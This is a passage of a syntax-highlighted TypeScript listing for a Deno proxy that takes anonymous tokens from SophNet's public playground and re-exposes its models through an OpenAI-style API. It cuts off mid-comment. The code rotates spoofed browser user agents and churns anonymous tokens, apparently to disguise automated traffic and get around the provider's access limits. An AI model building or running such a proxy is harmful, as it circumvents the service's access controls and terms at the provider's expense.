class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; serve &#125; <span class="keyword">from</span> <span class="string">&quot;https://deno.land/std@0.220.1/http/server.ts&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义常量</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SOPHNET_BASE_URL</span> = <span class="string">&quot;https://www.sophnet.com/api&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PROJECT_UUID</span> = <span class="string">&quot;Ar79PWUQUAhjJOja2orHs&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">3000</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">TOKEN_KEY</span> = <span class="string">&quot;sophnet_anonymous_token&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">MAX_RETRIES</span> = <span class="number">5</span>; <span class="comment">// 增加最大重试次数</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">INITIAL_RETRY_DELAY_MS</span> = <span class="number">100</span>; <span class="comment">// 初始重试延迟（毫秒）</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">MAX_RETRY_DELAY_MS</span> = <span class="number">5000</span>; <span class="comment">// 最大重试延迟（毫秒）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化Deno KV</span></span><br><span class="line"><span class="keyword">const</span> kv = <span class="keyword">await</span> <span class="title class_">Deno</span>.<span class="title function_">openKv</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">AnonymousTokenResponse</span> &#123;</span><br><span class="line">  <span class="attr">status</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="attr">message</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">result</span>: &#123;</span><br><span class="line">    <span class="attr">anonymousToken</span>: <span class="built_in">string</span>;</span><br><span class="line">    <span class="attr">expires</span>: <span class="built_in">string</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="attr">timestamp</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">SophNetModel</span> &#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="attr">serviceUuid</span>: <span class="built_in">string</span> | <span class="literal">null</span>;</span><br><span class="line">  <span class="attr">projectUuid</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">displayName</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">modelFamily</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">available</span>: <span class="built_in">boolean</span>;</span><br><span class="line">  <span class="attr">isBaseModel</span>: <span class="built_in">boolean</span>;</span><br><span class="line">  <span class="attr">features</span>: <span class="built_in">any</span>;</span><br><span class="line">  <span class="attr">supportedStream</span>: <span class="built_in">boolean</span>;</span><br><span class="line">  <span class="attr">supportedImageInputs</span>: <span class="built_in">boolean</span>;</span><br><span class="line">  <span class="attr">schema</span>: <span class="title class_">Array</span>&lt;&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">    <span class="attr">displayName</span>: <span class="built_in">string</span>;</span><br><span class="line">    <span class="attr">des</span>: <span class="built_in">string</span>;</span><br><span class="line">    <span class="attr">type</span>: <span class="built_in">string</span>;</span><br><span class="line">    <span class="attr">range</span>: <span class="built_in">number</span>[];</span><br><span class="line">    <span class="attr">defaultValue</span>: <span class="built_in">number</span>;</span><br><span class="line">    <span class="attr">required</span>: <span class="built_in">boolean</span>;</span><br><span class="line">  &#125;&gt;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">ModelsResponse</span> &#123;</span><br><span class="line">  <span class="attr">status</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="attr">message</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">result</span>: <span class="title class_">SophNetModel</span>[];</span><br><span class="line">  <span class="attr">timestamp</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">TokenInfo</span> &#123;</span><br><span class="line">  <span class="attr">token</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">expires</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Message</span> &#123;</span><br><span class="line">  <span class="attr">role</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">content</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Reference</span> &#123;</span><br><span class="line">  <span class="attr">content</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">id</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">index</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="attr">title</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">type</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">url</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 随机生成一个用户代理字符串</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getRandomUserAgent</span>(<span class="params"></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> userAgents = [</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.2151.44&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0&quot;</span>,</span><br><span class="line">  ];</span><br><span class="line">  <span class="keyword">return</span> userAgents[<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * userAgents.<span class="property">length</span>)];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算指数退避延迟</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getExponentialBackoffDelay</span>(<span class="params"><span class="attr">retryCount</span>: <span class="built_in">number</span></span>): <span class="built_in">number</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> delay = <span class="variable constant_">INITIAL_RETRY_DELAY_MS</span> * <span class="title class_">Math</span>.<span class="title function_">pow</span>(<span class="number">2</span>, retryCount);</span><br><span class="line">  <span class="keyword">const</span> jitter = <span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="variable constant_">INITIAL_RETRY_DELAY_MS</span>; <span class="comment">// 添加随机抖动</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">min</span>(delay + jitter, <span class="variable constant_">MAX_RETRY_DELAY_MS</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 延迟函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sleep</span>(<span class="params"><span class="attr">ms</span>: <span class="built_in">number</span></span>): <span class="title class_">Promise</span>&lt;<span class="built_in">void</span>&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, ms));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从KV获取token</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getTokenFromKV</span>(<span class="params"></span>): <span class="title class_">Promise</span>&lt;<span class="title class_">TokenInfo</span> | <span class="literal">null</span>&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> tokenEntry = <span class="keyword">await</span> kv.<span class="property">get</span>&lt;<span class="title class_">TokenInfo</span>&gt;([<span class="variable constant_">TOKEN_KEY</span>]);</span><br><span class="line">  <span class="keyword">return</span> tokenEntry.<span class="property">value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 存储token到KV</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">storeTokenToKV</span>(<span class="params"><span class="attr">token</span>: <span class="built_in">string</span>, <span class="attr">expires</span>: <span class="built_in">string</span></span>): <span class="title class_">Promise</span>&lt;<span class="built_in">void</span>&gt; &#123;</span><br><span class="line">  <span class="keyword">await</span> kv.<span class="title function_">set</span>([<span class="variable constant_">TOKEN_KEY</span>], &#123; token, expires &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取匿名token</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getAnonymousToken</span>(<span class="params">retryCount = <span class="number">0</span></span>): <span class="title class_">Promise</span>&lt;<span class="built_in">string</span>&gt; &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`<span class="subst">$&#123;SOPHNET_BASE_URL&#125;</span>/sys/login/anonymous`</span>, &#123;</span><br><span class="line">      <span class="attr">method</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">      <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="title function_">getRandomUserAgent</span>(), <span class="comment">// 使用随机UA</span></span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果是 429 或 500 错误，进行重试</span></span><br><span class="line">    <span class="keyword">if</span> ((response.<span class="property">status</span> === <span class="number">429</span> || response.<span class="property">status</span> &gt;= <span class="number">500</span>) &amp;&amp; retryCount &lt; <span class="variable constant_">MAX_RETRIES</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> delay = <span class="title function_">getExponentialBackoffDelay</span>(retryCount);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">`Get token failed with status <span class="subst">$&#123;response.status&#125;</span>. Retrying in <span class="subst">$&#123;delay&#125;</span>ms... (<span class="subst">$&#123;retryCount + <span class="number">1</span>&#125;</span>/<span class="subst">$&#123;MAX_RETRIES&#125;</span>)`</span>);</span><br><span class="line">      <span class="keyword">await</span> <span class="title function_">sleep</span>(delay);</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">getAnonymousToken</span>(retryCount + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!response.<span class="property">ok</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`Failed to get token: <span class="subst">$&#123;response.status&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>() <span class="keyword">as</span> <span class="title class_">AnonymousTokenResponse</span>;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">storeTokenToKV</span>(data.<span class="property">result</span>.<span class="property">anonymousToken</span>, data.<span class="property">result</span>.<span class="property">expires</span>);</span><br><span class="line">    <span class="keyword">return</span> data.<span class="property">result</span>.<span class="property">anonymousToken</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error getting anonymous token:&quot;</span>, error);</span><br><span class="line">    <span class="keyword">throw</span> error;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取有效token</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getValidToken</span>(<span class="params"></span>): <span class="title class_">Promise</span>&lt;<span class="built_in">string</span>&gt; &#123;</span><br><span class="line">  <span class="comment">// 先尝试从KV获取</span></span><br><span class="line">  <span class="keyword">const</span> tokenInfo = <span class="keyword">await</span> <span class="title function_">getTokenFromKV</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果KV中有token且未过期，则使用该token</span></span><br><span class="line">  <span class="keyword">if</span> (tokenInfo &amp;&amp; <span class="keyword">new</span> <span class="title class_">Date</span>(tokenInfo.<span class="property">expires</span>) &gt; <span class="keyword">new</span> <span class="title class_">Date</span>()) &#123;</span><br><span class="line">    <span class="keyword">return</span> tokenInfo.<span class="property">token</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 否则获取新token</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">await</span> <span class="title function_">getAnonymousToken</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取模型列表</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getModels</span>(<span class="params"><span class="attr">token</span>: <span class="built_in">string</span>, retryCount = <span class="number">0</span></span>): <span class="title class_">Promise</span>&lt;<span class="title class_">SophNetModel</span>[]&gt; &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(</span><br><span class="line">      <span class="string">`<span class="subst">$&#123;SOPHNET_BASE_URL&#125;</span>/public/playground/models?projectUuid=<span class="subst">$&#123;PROJECT_UUID&#125;</span>`</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">          <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">          <span class="string">&quot;User-Agent&quot;</span>: <span class="title function_">getRandomUserAgent</span>(), <span class="comment">// 使用随机UA</span></span><br><span class="line">          <span class="string">&quot;Authorization&quot;</span>: <span class="string">`Bearer anon-<span class="subst">$&#123;token&#125;</span>`</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果是401或403错误，尝试刷新token并重试</span></span><br><span class="line">    <span class="keyword">if</span> ((response.<span class="property">status</span> === <span class="number">401</span> || response.<span class="property">status</span> === <span class="number">403</span>) &amp;&amp; retryCount &lt; <span class="variable constant_">MAX_RETRIES</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Token expired, refreshing and retrying models request (<span class="subst">$&#123;retryCount + <span class="number">1</span>&#125;</span>/<span class="subst">$&#123;MAX_RETRIES&#125;</span>)...`</span>);</span><br><span class="line">      <span class="keyword">const</span> newToken = <span class="keyword">await</span> <span class="title function_">getAnonymousToken</span>();</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">await</span> <span class="title function_">getModels</span>(newToken, retryCount + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果是 429 或 500 错误，进行重试</span></span><br><span class="line">    <span class="keyword">if</span> ((response.<span class="property">status</span> === <span class="number">429</span> || response.<span class="property">status</span> &gt;= <span class="number">500</span>) &amp;&amp; retryCount &lt; <span class="variable constant_">MAX_RETRIES</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> delay = <span class="title function_">getExponentialBackoffDelay</span>(retryCount);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">`Get models failed with status <span class="subst">$&#123;response.status&#125;</span>. Retrying in <span class="subst">$&#123;delay&#125;</span>ms... (<span class="subst">$&#123;retryCount + <span class="number">1</span>&#125;</span>/<span class="subst">$&#123;MAX_RETRIES&#125;</span>)`</span>);</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">sleep</span>(delay);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">getModels</span>(token, retryCount + <span class="number">1</span>); <span class="comment">// 使用当前token重试，如果失败会在上面的逻辑中刷新</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!response.<span class="property">ok</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`Failed to get models: <span class="subst">$&#123;response.status&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>() <span class="keyword">as</span> <span class="title class_">ModelsResponse</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 请求成功后获取新token并存储 (后台刷新)</span></span><br><span class="line">    <span class="title function_">getAnonymousToken</span>().<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Background token refresh failed:&quot;</span>, err));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data.<span class="property">result</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error getting models:&quot;</span>, error);</span><br><span class="line">    <span class="keyword">throw</span> error;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将SophNet模型转换为OpenAI格式</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">transformModelsToOpenAIFormat</span>(<span class="params"><span class="attr">models</span>: <span class="title class_">SophNetModel</span>[]</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> transformedModels = [];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 为每个模型创建标准版本、搜索版本和全上下文版本</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> model <span class="keyword">of</span> models) &#123;</span><br><span class="line">    <span class="comment">// 添加标准模型</span></span><br><span class="line">    transformedModels.<span class="title function_">push</span>(&#123;</span><br><span class="line">      <span class="attr">id</span>: model.<span class="property">modelFamily</span>,</span><br><span class="line">      <span class="attr">object</span>: <span class="string">&quot;model&quot;</span>,</span><br><span class="line">      <span class="attr">created</span>: <span class="title class_">Date</span>.<span class="title function_">now</span>(),</span><br><span class="line">      <span class="attr">owned_by</span>: <span class="string">&quot;sophnet&quot;</span>,</span><br><span class="line">      <span class="attr">permission</span>: [&#123;</span><br><span class="line">        <span class="attr">id</span>: <span class="string">`modelperm-<span class="subst">$&#123;model.id&#125;</span>`</span>,</span><br><span class="line">        <span class="attr">object</span>: <span class="string">&quot;model_permission&quot;</span>,</span><br><span class="line">        <span class="attr">created</span>: <span class="title class_">Date</span>.<span class="title function_">now</span>(),</span><br><span class="line">        <span class="attr">allow_create_engine</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">allow_sampling</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">allow_logprobs</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">allow_search_indices</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">allow_view</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">allow_fine_tuning</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">organization</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">        <span class="attr">group</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="attr">is_blocking</span>: <span class="literal">false</span>,</span><br><span class="line">      &#125;],</span><br><span class="line">      <span class="attr">root</span>: model.<span class="property">modelFamily</span>,</span><br><span class="line">      <span class="attr">parent</span>: <span class="literal">null</span>,</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加搜索版本模型</span></span><br><span class="line">    transformedModels.<span class="title function_">push</span>(&#123;</span><br><span class="line">      <span class="attr">id</span>: <span class="string">`<span class="subst">$&#123;model.modelFamily&#125;</span>-Search`</span>,</span><br><span class="line">      <span class="attr">object</span>: <span class="string">&quot;model&quot;</span>,</span><br><span class="line">      <span class="attr">created</span>: <span class="title class_">Date</span>.<span class="title function_">now</span>(),</span><br><span class="line">      <span class="attr">owned_by</span>: <span class="string">&quot;sophnet&quot;</span>,</span><br><span class="line">      <span class="attr">permission</span>: [&#123;</span><br><span class="line">        <span class="attr">id</span>: <span class="string">`modelperm-<span class="subst">$&#123;model.id&#125;</span>-Search`</span>,</span><br><span class="line">        <span class="attr">object</span>: <span class="string">&quot;model_permission&quot;</span>,</span><br><span class="line">        <span class="attr">created</span>: <span class="title class_">Date</span>.<span class="title function_">now</span>(),</span><br><span class="line">        <span class="attr">allow_create_engine</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">allow_sampling</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">allow_logprobs</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">allow_search_indices</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">allow_view</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">allow_fine_tuning</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">organization</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">        <span class="attr">group</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="attr">is_blocking</span>: <span class="literal">false</span>,</span><br><span class="line">      &#125;],</span><br><span class="line">      <span class="attr">root</span>: model.<span class="property">modelFamily</span>,</span><br><span class="line">      <span class="attr">parent</span>: <span class="literal">null</span>,</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加全上下文版本模型</span></span><br><span class="line">    transformedModels.<span class="title function_">push</span>(&#123;</span><br><span class="line">      <span class="attr">id</span>: <span class="string">`<span class="subst">$&#123;model.modelFamily&#125;</span>-Full-Context`</span>,</span><br><span class="line">      <span class="attr">object</span>: <span class="string">&quot;model&quot;</span>,</span><br><span class="line">      <span class="attr">created</span>: <span class="title class_">Date</span>.<span class="title function_">now</span>(),</span><br><span class="line">      <span class="attr">owned_by</span>: <span class="string">&quot;sophnet&quot;</span>,</span><br><span class="line">      <span class="attr">permission</span>: [&#123;</span><br><span class="line">        <span class="attr">id</span>: <span class="string">`modelperm-<span class="subst">$&#123;model.id&#125;</span>-Full-Context`</span>,</span><br><span class="line">        <span class="attr">object</span>: <span class="string">&quot;model_permission&quot;</span>,</span><br><span class="line">        <span class="attr">created</span>: <span class="title class_">Date</span>.<span class="title function_">now</span>(),</span><br><span class="line">        <span class="attr">allow_create_engine</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">allow_sampling</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">allow_logprobs</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">allow_search_indices</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">allow_view</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">allow_fine_tuning</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">organization</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">        <span class="attr">group</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="attr">is_blocking</span>: <span class="literal">false</span>,</span><br><span class="line">      &#125;],</span><br><span class="line">      <span class="attr">root</span>: model.<span class="property">modelFamily</span>,</span><br><span class="line">      <span class="attr">parent</span>: <span class="literal">null</span>,</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 